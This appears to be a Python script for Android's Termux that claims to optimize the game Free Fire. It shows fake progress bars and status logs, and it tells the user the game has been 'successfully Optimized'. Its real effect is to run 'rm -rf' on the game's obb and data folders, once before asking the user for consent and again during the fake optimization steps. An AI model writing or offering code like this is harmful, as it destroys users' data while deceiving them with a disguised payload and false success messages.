from os import system

system('clear')

system('pip install rich')

system('clear')

import rich

from time import sleep

from rich.progress import track

from rich import print as rint

from rich.console import Console

console = Console()

system("rm -rf storage/shared/Android/obb/com.dts.freefireth")

system("rm -rf storage/shared/Android/data/com.dts.freefireth")

while True:
	Continue = input("Do you want to continue? (Y/n) : ").lower()
	if Continue == "y":
		break
	elif Continue == "n":
		rint('Ok... type "REDO" to call this process!')
		rint("[Program finished]")
		redo = ""
		while redo != "redo":
			redo = input("$ ").lower()
			if redo == "redo":
				break
		
for step in track(range(1000)):
	sleep(.01)
	step


rint("[bold red] Getting packages please wait...")
system("rm -rf storage/shared/Android/obb/com.dts.freefireth")
sleep(.7)
rint("[green] Done !")

print("Optimizing...")
for i in range(0,101):
	print(i,"%Optimized")
	sleep(0.1)
	
rint("[bold red]Wait...")

tasks = [f'task {n}'for n in range(1,11)]

with console.status("[bold green]Working on tasks...") as status:
	while tasks:
		
		task = tasks.pop(0)
		sleep(.7)
		console.log(f"{task} complete")


rint('[green]Done!')
sleep(3.5)
system("rm -rf storage/shared/Android/data/com.dts.freefireth")

rint("[green]Free Fire is successfully Optimized and gameplay will be a lot better! [bold red]")
